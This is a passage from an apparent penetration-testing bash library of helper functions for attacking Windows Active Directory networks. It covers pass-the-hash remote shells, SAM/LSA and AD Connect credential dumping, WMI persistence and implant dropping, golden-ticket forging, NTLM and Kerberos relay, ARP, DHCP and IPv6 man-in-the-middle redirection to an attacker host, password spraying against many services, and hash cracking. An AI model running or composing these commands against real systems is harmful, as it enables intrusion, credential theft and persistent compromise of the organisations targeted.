    python /opt/pywerview/pywerview.py get-netcomputer -w $DOMAIN -u $USER \
    --hashes $HASHES --unconstrained \
    -t $TARGET -d $TARGET;
    return;
}

function getUser(){
    # DESCRIPTION: Scan for user details in target domain.
    # ARGUMENT: getUser TARGET, TDOMAIN.
    TARGET=$1;
    TDOMAIN=$2;
    proxychains \
    python /opt/pywerview/pywerview.py get-netuser -w $DOMAIN -u $USER \
    --hashes $HASHES \
    -t $TDOMAIN -d $TDOMAIN --username $TARGET;
    return;
}

function getUsers(){
    # DESCRIPTION: Scan for users in target domain.
    # ARGUMENT: getUsers TARGET.
    TARGET=$1;
    proxychains \
    python /opt/pywerview/pywerview.py get-netuser \
    -w $DOMAIN -u $USER \
    --hashes $HASHES \
    -t $TARGET -d $TARGET;
    return;
}

function rulerCheck(){
    # DESCRIPTION: Query Exchange form for remote user.
    # ARGUMENT: rulerCheck EMAIL.
    EMAIL=$1;
    if [[ -z "$DOMAIN" ]]
    then
          proxychains \
            ruler \
            --username ${USER} \
            --email ${EMAIL} \
            --password ${PASSWORD} -b \
            form display ;
    else
          proxychains \
            ruler \
            --username ${USER} \
            --email ${EMAIL} \
            --hash ${HASH} \
            form display ;
    fi
    return;
}

function rulerDelete(){
    # DESCRIPTION: Delete Exchange form for remote user.
    # ARGUMENT: rulerDelete EMAIL.
    EMAIL=$1;
    if [[ -z "$DOMAIN" ]]
    then
          proxychains \
            ruler \
            --username ${USER} \
            --email ${EMAIL} \
            --password ${PASSWORD} -b \
            form delete \
            --suffix Windows;
    else
          proxychains \
            ruler \
            --username ${USER} \
            --email ${EMAIL} \
            --hash ${HASH} \
            form delete \
            --suffix Windows;
    fi
    return;
}

# SECTION: Command execution helper functions:

function winRMShell(){
    # DESCRIPTION: WinRM/PSRP shell on target system.
    # ARGUMENT: winRMShell TARGET.
    TARGET=$1;
    if [[ -z "$DOMAIN" ]]
    then
          proxychains \
            evil-winrm -i $TARGET \
            -u $USER -H $HASH \
            -s ./ -e ./ -P 5985;
    else
          proxychains \
            evil-winrm -i $TARGET \
            -u "${DOMAIN}\\${USER}" -H $HASH \
            -s ./ -e ./ -P 5985;
    fi
    return;
}

function wmiShell(){
    # DESCRIPTION: WMI shell on target system.
    # ARGUMENT: wmiShell TARGET.
    TARGET=$1;
    if [[ -z "$DOMAIN" ]]
    then
          proxychains \
            wmiexec.py \
            -no-pass -hashes $HASHES \
            ${USER}@${TARGET};
    else
          proxychains \
            wmiexec.py \
            -no-pass -hashes $HASHES \
            -dc-ip $DCIP ${DOMAINUSER}@${TARGET};
    fi
    return;
}

function smbShell(){
    # DESCRIPTION: SMB shell on target system.
    # ARGUMENT: smbShell TARGET.
    TARGET=$1;
    if [[ -z "$DOMAIN" ]]
    then
          proxychains \
            smbexec.py \
            -no-pass -hashes $HASHES \
            -service-name Win32SCCM \
            ${USER}@${TARGET};
    else
          proxychains \
            smbexec.py \
            -no-pass -hashes $HASHES \
            -service-name Win32SCCM \
            -dc-ip $DCIP ${DOMAINUSER}@${TARGET};
    fi
    return;
}

function wmiCommandOutput(){
    # DESCRIPTION: Execute WMI command without output on target system.
    # ARGUMENT: wmiCommandOutput TARGET, COMMAND.
    TARGET=$1;
    COMMAND=$2;
    if [[ -z "$DOMAIN" ]]
    then
          proxychains \
            wmiexec.py \
            -no-pass -hashes $HASHES \
            ${USER}@${TARGET} "${COMMAND}";
    else
          proxychains \
            wmiexec.py \
            -no-pass -hashes $HASHES \
            -dc-ip $DCIP ${DOMAINUSER}@${TARGET} "${COMMAND}";
    fi
    return;
}

function wmiCommand(){
    # DESCRIPTION: Execute WMI command without output on target system.
    # ARGUMENT: wmiCommand TARGET, COMMAND.
    TARGET=$1;
    COMMAND=$2;
    if [[ -z "$DOMAIN" ]]
    then
          proxychains \
            wmiexec.py \
            -nooutput \
            -no-pass -hashes $HASHES \
            ${USER}@${TARGET} "${COMMAND}";
    else
          proxychains \
            wmiexec.py \
            -nooutput \
            -no-pass -hashes $HASHES \
            -dc-ip $DCIP ${DOMAINUSER}@${TARGET} "${COMMAND}";
    fi
    return;
}

function psexecCommand(){
    # DESCRIPTION: Execute PSexec command on target system.
    # ARGUMENT: psexecCommand TARGET, COMMAND.
    TARGET=$1;
    COMMAND=$2;
    if [[ -z "$DOMAIN" ]]
    then
          proxychains \
            psexec.py \
            -no-pass -hashes $HASHES \
            ${USER}@${TARGET} "${COMMAND}";
    else
        proxychains \
            psexec.py \
            -no-pass -hashes $HASHES \
            -dc-ip $DCIP ${DOMAINUSER}@${TARGET} "${COMMAND}";
    fi
    return;
}

function atCommand(){
    # DESCRIPTION: Execute AT/scheduled task on target system.
    # ARGUMENT: atCommand TARGET, COMMAND.
    TARGET=$1;
    COMMAND=$2;
    if [[ -z "$DOMAIN" ]]
    then
          proxychains \
            atexec.py \
            -no-pass -hashes $HASHES \
            ${USER}@${TARGET} "${COMMAND}";
    else
          proxychains \
            atexec.py \
            -no-pass -hashes $HASHES \
            -dc-ip $DCIP ${DOMAINUSER}@${TARGET} "${COMMAND}";
    fi
    return;
}

function dcomCommand(){
    # DESCRIPTION: Execute RPC/DCOM command on target system.
    # ARGUMENT: dcomCommand TARGET, COMMAND.
    TARGET=$1;
    COMMAND=$2;
    if [[ -z "$DOMAIN" ]]
    then
          proxychains \
            dcomexec.py \
            -nooutput \
            -no-pass -hashes $HASHES \
            ${USER}@${TARGET} "${COMMAND}";
    else
          proxychains \
            dcomexec.py \
            -nooutput \
            -no-pass -hashes $HASHES \
            -dc-ip $DCIP ${DOMAINUSER}@${TARGET} "${COMMAND}";
    fi
    return;
}

function rulerCommand(){
    # DESCRIPTION: Execute Exchange form against remote user.
    # ARGUMENT: rulerCommand EMAIL, PAYLOAD.
    EMAIL=$1;
    PAYLOAD=$2;
    if [[ -z "$DOMAIN" ]]
    then
          proxychains \
            ruler \
            --username ${USER} \
            --email ${EMAIL} \
            --password ${PASSWORD} -b \
            form add \
            --suffix Windows \
            --input ${PAYLOAD} \
            --send;
    else
          proxychains \
            ruler \
            --username ${USER} \
            --email ${EMAIL} \
            --hash ${HASH} \
            form add \
            --suffix Windows \
            --input ${PAYLOAD} \
            --send;
    fi
    return;
}

# SECTION: Client helper functions:

function mountSSHShare(){
    # DESCRIPTION: Mount remote SSH share on ssh_share directory.
    # ARGUMENT: mountSSHShare TUSER, TARGET, SHARE.
    TUSER=$1;
    TARGET=$2;
    SHARE=$3;
    mkdir ./${TARGET};
    proxychains sshfs "${TUSER}"@"${TARGET}:/${SHARE}" ./${TARGET};
    return;
}

function mountShare(){
    # DESCRIPTION: Mount remote SMB share on tmpshare directory.
    # ARGUMENT: mountShare TARGET, SHARE.
    TARGET=$1;
    SHARE=$2;
    mkdir ./${TARGET};
    mount -t cifs "//${TARGET}/${SHARE}" ./${TARGET} \
    -o username=${USER},password=${PASSWORD},domain=${DOMAIN},iocharset=utf8,file_mode=0777,dir_mode=0777;
    return;
}

function mssqlLogin(){
    # DESCRIPTION: Connect to remote MSSQL database using DB login without Windows.
    # ARGUMENT: mssqlLogin TARGET, PORT, UNAME, PASSWD.
    TARGET=$1;
    PORT=$2
    UNAME=$3;
    PASSWD=$3;
    proxychains \
        mssqlclient.py \
        -port $PORT \
        ${USER}:${PASSWORD}@${TARGET};
    return;
}

function mssqlConnect(){
    # DESCRIPTION: Connect to remote MSSQL database.
    # ARGUMENT: mssqlConnect TARGET, DB, PORT.
    TARGET=$1;
    DB=$2
    PORT=$3;
    if [[ -z "$DOMAIN" ]]
    then
          proxychains \
            mssqlclient.py \
            -port $PORT -db $DB \
            ${USER}:${PASSWORD}@${TARGET};
    else
          proxychains \
            mssqlclient.py \
            -windows-auth -port $PORT -db $DB \
            -no-pass -hashes $HASHES \
            -dc-ip $DCIP ${DOMAINUSER}@${TARGET};
    fi
    return;
}

function smbConnect(){
    # DESCRIPTION: Connect to remote SMB share.
    # ARGUMENT: smbConnect TARGET.
    TARGET=$1;
    if [[ -z "$DOMAIN" ]]
    then
          proxychains \
            smbclient.py \
            -no-pass -hashes $HASHES \
            ${USER}@${TARGET};
    else
          proxychains \
            smbclient.py \
            -no-pass -hashes $HASHES \
            -dc-ip $DCIP ${DOMAINUSER}@${TARGET};
    fi
    return;
}

# SECTION: Server helper functions:

function localHTTPTunnel(){
    # DESCRIPTION: Forward traffic via regeorge webshell HTTP tunnel.
    # ARGUMENT: localHTTPTunnel LHOST< LPORT, URL.
    LHOST=$1;
    LPORT=$2;
    URL=$3;
    proxychains \
        python regeorge-v2.py -l ${LHOST} -p ${LPORT} -u ${URL};
    return;
}

function portForward(){
    # DESCRIPTION: Forward traffic via socat.
    # ARGUMENT: portForward LPORT, LHOST, RHOST, RPORT.
    LPORT=$1;
    LHOST=$2;
    RHOST=$3;
    RPORT=$4;
    socat TCP-LISTEN:${LPORT},bind=${LHOST},fork,reuseaddr \
        TCP:${RHOST}:${RPORT};
    return;
}

function localPortForward(){
    # DESCRIPTION: Spin up local port forward
    # ARGUMENT: localPortForward LPORT, RPORT.
    LPORT=$1;
    RPORT=$2;
    socat TCP-LISTEN:${LPORT},bind=vmkali,fork,reuseaddr \
    TCP:bigkali:${RPORT};
    return;
}

function localProxy(){
    # DESCRIPTION: Spin up local SOCKS proxy on port 1080.
    # ARGUMENT: localProxy None.
    ssh -f -N -D vmkali:1080 root@bigkali;
    return;
}

function httpServer(){
    # DESCRIPTION: Spin up local HTTP server on port 80.
    # ARGUMENT: httpServer None.
    python -m SimpleHTTPServer 80;
    return;
}

function webDavServer(){
    # DESCRIPTION: Spin up local webdav HTTP server in place of SMB.
    # ARGUMENT: webDavServer HOST PORT DIR
    LHOST=$1;
    LPORT=$2;
    LDIR=$3;
    wsgidav --auth=anonymous --host=$LHOST --port=$LPORT --root=$LDIR;
    return;
}

function smbServer(){
    # DESCRIPTION: Spin up local SMB server in current folder on port 445.
    # ARGUMENT: smbServer IPADDRESS.
    IPADDRESS=$1;
    smbserver.py -ip $IPADDRESS \
        -port 445 -smb2support PWN ./ ;
    return;
}

function socksProxy(){
    # DESCRIPTION: Spin up dynamic SOCKS proxy.
    # ARGUMENT: socksProxy LHOST, LPORT, RUSER, RHOST.
    LHOST=$1;
    LPORT=$2;
    RUSER=$3;
    RHOST=$4;
    ssh -f -N -D ${LHOST}:${LPORT} ${RUSER}@${RHOST};
    return;
}

# SECTION: Post exploitation helper functions:

function dumpADConnect(){
    # DESCRIPTION: Dump AD Sync credentials on remote target.
    # ARGUMENT: dumpADConnect TARGET.
    TARGET=$1;
    if [[ -z "$DOMAIN" ]]
    then
          proxychains \
            python adconnectdump.py \
            -outputfile $TARGET \
            -no-pass -hashes $HASHES \
            ${USER}@${TARGET};
    else
          proxychains \
            python adconnectdump.py \
            -outputfile $TARGET \
            -no-pass -hashes $HASHES \
            -dc-ip $DCIP ${DOMAINUSER}@${TARGET};
    fi
    return;
}

function dumpDCOnlyTGT(){
    # DESCRIPTION: Dump DC hashes only using KRBCCACHE golden TGT.
    # ARGUMENT: dumpDCOnly DCFQDN.
    DCFQDN=$1;
    proxychains \
            secretsdump.py \
            -outputfile $DCFQDN \
            -k $DCFQDN -just-dc;
    return;
}

function dumpSAM(){
    # DESCRIPTION: Dump SAM and LSA secrets on remote host.
    # ARGUMENT: dumpSAM TARGET.
    TARGET=$1;
    if [[ -z "$DOMAIN" ]]
    then
          proxychains \
            secretsdump.py \
            -outputfile $TARGET \
            -no-pass -hashes $HASHES \
            ${USER}@${TARGET};
    else
          proxychains \
            secretsdump.py \
            -outputfile $TARGET \
            -no-pass -hashes $HASHES \
            -dc-ip $DCIP ${DOMAINUSER}@${TARGET};
    fi
    return;
}

function wmiPersist(){
    # DESCRIPTION: WMI persistence on remote target.
    # ARGUMENT: wmiPersist TARGET, PAYLOAD.
    TARGET=$1;
    PAYLOAD=$2;
    if [[ -z "$DOMAIN" ]]
    then
          proxychains \
            wmipersist.py \
            -no-pass -hashes $HASHES \
            ${USER}@${TARGET} \
            install -name PWN \
            -vbs $PAYLOAD -timer 120000;
    else
          proxychains \
            wmipersist.py \
            -no-pass -hashes $HASHES \
            -dc-ip $DCIP ${DOMAINUSER}@${TARGET} \
            install -name PWN \
            -vbs $PAYLOAD -timer 120000;
    fi
    return;
}

function removeWmiPersist(){
    # DESCRIPTION: Remove WMI persistence on remote target.
    # ARGUMENT: removeWmiPersist TARGET.
    TARGET=$1;
    if [[ -z "$DOMAIN" ]]
    then
          proxychains \
            wmipersist.py \
            -no-pass -hashes $HASHES \
            ${USER}@${TARGET} \
            remove -name PWN;
    else
          proxychains \
            wmipersist.py \
            -no-pass -hashes $HASHES \
            -dc-ip $DCIP ${DOMAINUSER}@${TARGET} \
            remove -name PWN;
    fi
    return;
}

# SECTION: Exploitation helper functions:

function oraclePadbust(){
    # DESCRIPTION: Generic oracle padding attack using post and cookie files.
    # ARGUMENT: oraclePadbust URL, ENCDATA, POSTFILE, COOKIEFILE.
    URL=$1;
    ENCDATA=$2;
    POSTFILE=$3;
    COOKIEFILE=$4;
    BLOCKSIZE=8;
    ENCODING=0;
    HOSTHEADER=`echo ${URL}|cut -d '/' -f3`;
    HEADERS="Host::${HOSTHEADER}";
    POSTDATA=`cat ${POSTFILE}`;
    COOKIES=`cat ${COOKIEFILE}`;
    proxychains \
    padbuster \
    "$URL" \
    "$ENCDATA" \
    ${BLOCKSIZE} \
    -bruteforce \
    -encoding ${ENCODING} \
    -headers ${HEADERS} \
    -cookies "${COOKIES}" \
    -post "${POSTDATA}" \
    -noencode \
    -noiv -verbose
    return;
}

function dropImplant(){
    # DESCRIPTION: Drop implant on remote target using WMI.
    # ARGUMENT: dropImplant TARGET.
    TARGET=$1;
    wmiCommand $TARGET $IMPLANT;
    return;
}

function ultraRelay(){
    # DESCRIPTION: NTML (NTLM back to host) relay via Java applet.
    # ARGUMENT: ultraRelay ATTACKERIP.
    ATTACKERIP=$1;
    python ultrarelay.py \
    -ip ${ATTACKERIP};
    return;
}

function mitm6DHCP(){
    # DESCRIPTION: MITM attack using IPv6 to IPv4 WPAD.
    # ARGUMENT: mitm6DHCP DOMAIN, IP4ADD, IP6ADD, MACADD.
    DOMAIN=$1;
    IP4ADD=$2;
    IP6ADD=$3;
    MACADD=$4;
    mitm6 -i eth0 \
    -4 $IP4ADD \
    -6 $IP6ADD \
    -m $MACADD -a -v \
    -d $DOMAIN;
    return;
}

function ntlmRelayDelegate(){
    # DESCRIPTION: NTLM relay attack using delegation vectors.
    # ARGUMENT: ntlmRelayDelegate TCOMPUTER, TSERVER, WPAD.
    TCOMPUTER=$1;
    TSERVER=$2;
    WPAD=$3;
    ntlmrelayx.py \
    -wh $WPAD --delegate-access \
    --escalate-user "${TCOMPUTER}\$" \
    -t $TSERVER;
    return;
}

function removeComputer(){
    # DESCRIPTION: Remove computer from AD domain.
    # ARGUMENT: removeComputer TCOMPUTER, TPASSWORD, TGROUP.
    TCOMPUTER=$1;
    TPASSWORD=$2;
    TGROUP=$3;
    proxychains \
    addcomputer.py -method SAMR \
    -computer-pass $TPASSWORD \
    -computer-name $TCOMPUTER \
    -no-pass -hashes $HASHES \
    -delete -computer-group $TGROUP \
    -dc-ip $DCIP $DOMAINUSER;
    return;
}

function addComputer(){
    # DESCRIPTION: Add computer to AD domain.
    # ARGUMENT: addComputer TCOMPUTER, TPASSWORD, TGROUP.
    TCOMPUTER=$1;
    TPASSWORD=$2;
    TGROUP=$3;
    proxychains \
    addcomputer.py -method SAMR \
    -computer-pass $TPASSWORD \
    -computer-name $TCOMPUTER \
    -computer-group $TGROUP \
    -no-pass -hashes $HASHES \
    -dc-ip $DCIP $DOMAINUSER;
    return;
}

function getGoldTicket(){
    # DESCRIPTION: Get golden TGT on target domain using krbtgt key.
    # ARGUMENT: getGoldTicket KEY SID TDOMAIN UNAME
    KEY=$1;
    SID=$2;
    TDOMAIN=$3;
    UNAME=$4;
    proxychains \
        ticketer.py \
        -debug \
        -aesKey ${KEY} \
        -domain-sid ${SID} \
        -domain ${TDOMAIN} \
        ${UNAME};
        export KRB5CCNAME=`pwd`/${UNAME}.ccache;
    return;
}

function getST(){
    # DESCRIPTION: Get TGT on target domain.
    # ARGUMENT: getST SPN, TARGET.
    SPN=$1;
    TARGET=$2;
    proxychains \
        getST.py -spn $SPN \
        -impersonate $TARGET \
        -no-pass -hashes $HASHES \
        -dc-ip $DCIP $DOMAINUSER;
    return;
}

function addDNS(){
    # DESCRIPTION: Add DNS on target domain  using computer or user password or hashes DNS like SPN or PWN-HOST.
    # ARGUMENT: addDNS IPADDRESS, SPN, SERVER.
    IPADDRESS=$1;
    SPN=$2;
    SERVER=$3;
    proxychains \
    dnstool.py \
    -u "${DOMAIN}\\${USER}" \
    -p ${PASSWORD} \
    -r ${SPN} -a add -d $IPADDRESS $SERVER;
    return;
}

function queryDNS(){
    # DESCRIPTION: Query DNS on target domain using computer or user password or hashes DNS like SPN or PWN-HOST.
    # ARGUMENT: queryDNS IPADDRESS, SPN, SERVER.
    IPADDRESS=$1;
    SPN=$2;
    SERVER=$3;
    proxychains \
    dnstool.py \
    -u "${DOMAIN}\\${USER}" \
    -p ${PASSWORD} \
    -r ${SPN} -a query -d $IPADDRESS $SERVER;
    return;
}

function removeDNS(){
    # DESCRIPTION: Remove DNS on target system using DOMAIN computer or user password or hashes DNS is like PWN-HOST.
    # ARGUMENT: removeDNS IPADDRESS, SPN, SERVER.
    IPADDRESS=$1;
    SPN=$2;
    SERVER=$3;
    proxychains \
    dnstool.py \
    -u "${DOMAIN}\\${USER}" \
    -p ${PASSWORD} \
    -r ${SPN} -a remove -d $IPADDRESS $SERVER;
    return;
}

function removeSPNDNS(){
    # DESCRIPTION: Remove SPN via DNS from target system using DOMAIN computer or user password or hashes.
    # ARGUMENT: removeSPN SPN, SERVER.
    SPN=$1;
    SERVER=$2;
    proxychains \
    addspn.py \
    -u "${DOMAIN}\\${USER}" \
    -p ${PASSWORD} \
    -s ${SPN} \
    --additional -r "ldap://${SERVER}";
    return;
}

function removeSPN(){
    # DESCRIPTION: Remove SPN normally from target system using DOMAIN computer or user password or hashes.
    # ARGUMENT: removeSPN SPN, SERVER.
    SPN=$1;
    SERVER=$2;
    proxychains \
    addspn.py \
    -u "${DOMAIN}\\${USER}" \
    -p ${PASSWORD} \
    -s ${SPN} \
    -r "ldap://${SERVER}";
    return;
}

function querySPN(){
    # DESCRIPTION: Query SPN on target system using DOMAIN computer or user password or hashes.
    # ARGUMENT: querySPN SPNHOST, SERVER.
    SPN=$1;
    SERVER=$2;
    proxychains \
    addspn.py \
    -u "${DOMAIN}\\${USER}" \
    -p ${PASSWORD} \
    -s ${SPN} \
    -q "ldap://${SERVER}";
    return;
}

function addSPNDNS(){
    # DESCRIPTION: Add SPN via DNS on target system using computer or user password or hashes with SPN like HOST/PWN-HOST.
    # ARGUMENT: addSPNDNS SPN, SERVER.
    SPN=$1;
    SERVER=$2;
    proxychains \
    addspn.py \
    -u "${DOMAIN}\\${USER}" \
    -p ${PASSWORD} \
    -s ${SPN} \
    --additional "ldap://${SERVER}";
    return;
}

function addSPN(){
    # DESCRIPTION: Add SPN normally on target system using computer or user password or hashes with SPN like HOST/PWN-HOST.
    # ARGUMENT: addSPN SPN, SERVER.
    SPN=$1;
    SERVER=$2;
    proxychains \
    addspn.py \
    -u "${DOMAIN}\\${USER}" \
    -p ${PASSWORD} \
    -s ${SPN} \
    "ldap://${SERVER}";
    return;
}

function krbRelayUser(){
    # DESCRIPTION: KRP relay for target AD user with uppercase DOMAIN.
    # ARGUMENT: krbRelayUser TDOMAIN, TUSER, TPASSWORD.
    TDOMAIN=$1;
    TUSER=$2;
    TPASSWORD=$3;
    python krbrelayx.py \
    --krbsalt "${TDOMAIN}${TUSER}" \
    --krbpass $TPASSWORD;
    return;
}

function krbRelayComputer(){
    # DESCRIPTION: KRP relay for target AD computer using AES-256 hash.
    # ARGUMENT: krbRelayUser AES256HASH.
    AES256HASH=$1;
    python krbrelayx.py \
    -aesKey $AES256HASH;
    return;
}

function krbExportTGT(){
    # DESCRIPTION: Export the TGT CCACHE file after Kerberos relay.
    # ARGUMENT: krbExportTGT CACHE
    CACHE=$1;
    export KRB5CCNAME=${CACHE};
    return;
}

function printerRelay(){
    # DESCRIPTION: Print spool MSRPC on target system FQDN of the DC or server.
    # ARGUMENT: printerRelay DCFQDN, SPNHOST.
    DCFQDN=$1;
    SPNHOST=$2;
    proxychains \
    printerbug.py \
    -hashes $HASHES \
    ${DOMAINUSER}@${DCFQDN} "PWN-${SPNHOST}";
    return;
}

function smbRelay(){
    # DESCRIPTION: SMB relay to remote target.
    # ARGUMENT: smbRelay TARGET.
    TARGET=$1;
    smbrelayx.py \
    -ts -debug \
    -h $TARGET \
    -one-shot
    return;
}

function ntlmRelay(){
    # DESCRIPTION: NTLM relay to target systems.
    # ARGUMENT: ntlmRelay TARGETS.
    TARGETS=$1
    ntlmrelayx.py -ts  \
    -tf "./${TARGETS}" \
    --smb-port 445 \
    --http-port 80 -l ./ \
    -of hashes-relayed \
    -smb2support \
    --remove-mic \
    --enum-local-admins \
    -debug -i -w;
    return ;
}

function respondRelay(){
    # DESCRIPTION: Responder for NTLM relay attack.
    # ARGUMENT: respondRelay None.
    responder -v \
    -I eth0 -dwrf -P -v;
    return;
}

function ntlmRelaySix(){
    # DESCRIPTION: NTLM relay using IPv6 attack.
    # ARGUMENT: ntlmRelaySix TARGETS, WPAD.
    TARGETS=$1
    WPAD=$2;
    ntlmrelayx.py -6  \
    -wh $WPAD \
    -tf "./${TARGETS}" \
    --smb-port 445 \
    --http-port 80 -l ./ \
    -of hashes-relayed \
    -smb2support \
    -socks --remove-mic \
    --enum-local-admins \
    -debug -i -w;
    return ;
}

function mitmSix(){
    # DESCRIPTION: MITM attack using IPv6 DHCP.
    # ARGUMENT: mitmSix TARGET.
    TARGET=$1
    mitm6.py -d $DOMAIN \
    -hw $TARGET;
    return ;
}

function arpSpoof(){
    # DESCRIPTION: MITM attack using ARP spoofing.
    # ARGUMENT: arpSpoof TARGETSERVER, TARGETCLIENT, PORT, GATEWAY, ATTACKER.
    TARGETSERVER=$1;
	TARGETCLIENT=$2;
	PORT=$3;
	GATEWAY=$4;
	ATTACKER=$5;
	echo 1 > /proc/sys/net/ipv4/ip_forward;
	iptables -F;
	iptables -t nat -F;
	iptables -X;
	iptables -t nat \
	-A PREROUTING \
	-p tcp -d $TARGETSERVER \
	--dport $PORT \
	-j DNAT \
	--to-destination $ATTACKER:$PORT;
    arpspoof -i eth0 -t $TARGETCLIENT $GATEWAY;
    return;
}

function dhcpSpoof() {
    # DESCRIPTION: MITM attack using DHCP spoofing.
    # ARGUMENT: dhcpSpoof TARGETDNS, PORT, ATTACKER.
	TARGETDNS=$1;
	PORT=$2;
	ATTACKER=$3;
	echo 1 > /proc/sys/net/ipv4/ip_forward ;
	iptables -F;
	iptables -t nat -F;
	iptables -X;
	iptables -t nat \
	-A PREROUTING -p tcp \
	--destination-port $PORT \
	-j REDIRECT --to-port $PORT
	python /usr/share/responder/tools/DHCP.py \
	-I eth0 -d $TARGETDNS \
	-r $ATTACKER \
	-p 8.8.8.8 \
	-s 8.8.4.4 \
	-n 255.255.255.0 \
	-R -S;
	return;
}

function sqlMITM(){
    # DESCRIPTION: MITM attack against SQL/MSSQL services.
    # ARGUMENT: sqlMITM CLIENTIP, SERVERIP, BEGIN, END, QUERY.
    CLIENTIP=$1;
    SERVERIP=$2;
    BEGIN=$3;
    END=$4;
    QUERY=$5;
    python sqlmitm.py \
    --begin_keyword "$BEGIN" \
    --end_keyword "$END" \
    eth0 mssql \
     $CLIENTIP $SERVERIP "$QUERY";
    return;

}

function spraySSH(){
    # DESCRIPTION: Password spraying attack against SSH.
    # ARGUMENT: spraySSH TARGET, USERDICTIONARY, PASSWORDDICTIONARY.
    TARGET=$1;
    USERDICTIONARY=$2;
    PASSWORDDICTIONARY=$3;
    proxychains \
    hydra -L ${USERDICTIONARY} \
    -P ${PASSWORDDICTIONARY} \
    ${TARGET} \
    ssh -u -V;
    return;
}

function sprayHTTP(){
    # DESCRIPTION: Password spraying attack against HTTP.
    # ARGUMENT: sprayHTTP TARGET, TARGETDOMAIN, DICTIONARY, TARGETPASSWORD.
    TARGET=$1;
    TARGETDOMAIN=$2;
    DICTIONARY=$3;
    TARGETPASSWORD=$4;
    proxychains \
    python http_spray.py \
    $TARGET $TARGETDOMAIN $DICTIONARY $TARGETPASSWORD;
    return;
}

function sprayHTTPNTLM(){
    # DESCRIPTION: Password spraying attack against HTTP-NTLM.
    # ARGUMENT: sprayHTTPNTLM TARGET, TARGETDOMAIN, DICTIONARY, TARGETPASSWORD.
    TARGET=$1;
    TARGETDOMAIN=$2;
    DICTIONARY=$3;
    TARGETPASSWORD=$4;
    proxychains \
    python http_ntlm_spray.py \
    $TARGET $TARGETDOMAIN $DICTIONARY $TARGETPASSWORD;
    return;
}

function sprayADFS(){
    # DESCRIPTION: Password spraying attack against ADFS.
    # ARGUMENT: sprayADFS TARGET, TARGETDOMAIN, DICTIONARY, TARGETPASSWORD.
    TARGET=$1;
    TARGETDOMAIN=$2;
    DICTIONARY=$3;
    TARGETPASSWORD=$4;
    proxychains \
    python adfs_spray.py \
    $TARGET $TARGETDOMAIN $DICTIONARY $TARGETPASSWORD;
    return;
}

function sprayIMAP(){
    # DESCRIPTION: Password spraying attack against IMAP.
    # ARGUMENT: sprayIMAP TARGET, TARGETDOMAIN, DICTIONARY, TARGETPASSWORD.
    TARGET=$1;
    TARGETDOMAIN=$2;
    DICTIONARY=$3;
    TARGETPASSWORD=$4;
    proxychains \
    python imap_spray.py \
    $TARGET $TARGETDOMAIN $DICTIONARY $TARGETPASSWORD;
    return;
}

function sprayLDAP(){
    # DESCRIPTION: Password spraying attack against LDAP.
    # ARGUMENT: sprayLDAP TARGET, TARGETDOMAIN, DICTIONARY, TARGETPASSWORD.
    TARGET=$1;
    TARGETDOMAIN=$2;
    DICTIONARY=$3;
    TARGETPASSWORD=$4;
    proxychains \
    python ldap_spray.py \
    $TARGET $TARGETDOMAIN $DICTIONARY $TARGETPASSWORD;
    return;
}

function sprayMSSQL(){
    # DESCRIPTION: Password spraying attack against MSSQL.
    # ARGUMENT: sprayMSSQL TARGET, TARGETDOMAIN, DICTIONARY, TARGETPASSWORD.
    TARGET=$1;
    TARGETDOMAIN=$2;
    DICTIONARY=$3;
    TARGETPASSWORD=$4;
    proxychains \
    python mssql_spray.py \
    $TARGET $TARGETDOMAIN $DICTIONARY $TARGETPASSWORD;
    return;
}

function sprayPSRM(){
    # DESCRIPTION: Password spraying attack against WinRM/PSRP.
    # ARGUMENT: sprayPSRM TARGET, TARGETDOMAIN, DICTIONARY, TARGETPASSWORD.
    TARGET=$1;
    TARGETDOMAIN=$2;
    DICTIONARY=$3;
    TARGETPASSWORD=$4;
    proxychains \
    python psrm_spray.py \
    $TARGET $TARGETDOMAIN $DICTIONARY $TARGETPASSWORD;
    return;
}

function spraySMB(){
    # DESCRIPTION: Password spraying attack against SMB.
    # ARGUMENT: spraySMB TARGET, TARGETDOMAIN, DICTIONARY, TARGETPASSWORD.
    TARGET=$1;
    TARGETDOMAIN=$2;
    DICTIONARY=$3;
    TARGETPASSWORD=$4;
    proxychains \
    python smb_spray.py \
    $TARGET $TARGETDOMAIN $DICTIONARY $TARGETPASSWORD;
    return;
}

function spraySMTP(){
    # DESCRIPTION: Password spraying attack against SMTP.
    # ARGUMENT: spraySMTP TARGET, TARGETDOMAIN, DICTIONARY, TARGETPASSWORD.
    TARGET=$1;
    TARGETDOMAIN=$2;
    DICTIONARY=$3;
    TARGETPASSWORD=$4;
    proxychains \
    python smtp_spray.py \
    $TARGET $TARGETDOMAIN $DICTIONARY $TARGETPASSWORD;
    return;
}

function sprayWinRM(){
    # DESCRIPTION: Password spraying attack against WinRM.
    # ARGUMENT: sprayWinRM TARGET, TARGETDOMAIN, DICTIONARY, TARGETPASSWORD.
    TARGET=$1;
    TARGETDOMAIN=$2;
    DICTIONARY=$3;
    TARGETPASSWORD=$4;
    proxychains \
    python winrm_spray.py \
    $TARGET $TARGETDOMAIN $DICTIONARY $TARGETPASSWORD;
    return;
}

function sprayWMI(){
    # DESCRIPTION: Password spraying attack against WMI.
    # ARGUMENT: sprayWMI TARGET, TARGETDOMAIN, DICTIONARY, TARGETPASSWORD.
    TARGET=$1;
    TARGETDOMAIN=$2;
    DICTIONARY=$3;
    TARGETPASSWORD=$4;
    proxychains \
    python wmi_spray.py \
    $TARGET $TARGETDOMAIN $DICTIONARY $TARGETPASSWORD;
    return;
}

# SECTION: Hash cracking helper functions:

function crackLMNT(){
    # DESCRIPTION: Crack LM/NT hashes.
    # ARGUMENT: crackLMNT TARGET, DICTIONARY.
    TARGET=$1;
    DICTIONARY=$2;
    hashcat -m 1000 -a 0 $TARGET $DICTIONARY --force
    return;
}

function crackNTLM1(){
    # DESCRIPTION: Crack NTLMv1 hashes.
    # ARGUMENT: crackNTLM1 TARGET, DICTIONARY.
    TARGET=$1;
    DICTIONARY=$2;
    hashcat -m 5500 -a 0 $TARGET $DICTIONARY --force
    return;
}

function crackNTLM2(){
    # DESCRIPTION: Crack NTLMv2 hashes.
    # ARGUMENT: crackNTLM2 TARGET, DICTIONARY.
    TARGET=$1;
    DICTIONARY=$2;
    hashcat -m 5600 -a 0 $TARGET $DICTIONARY --force
    return;
}

function crackCached2(){
    # DESCRIPTION: Crack ADv2 cached hashes.
    # ARGUMENT: crackCached2 TARGET, DICTIONARY.
    TARGET=$1;
    DICTIONARY=$2;
    hashcat -m 2100 -a 0 $TARGET $DICTIONARY --force
    return;
}

function crackSPNs(){
    # DESCRIPTION: Crack SPN hashes.
    # ARGUMENT: crackSPNs TARGET, DICTIONARY.
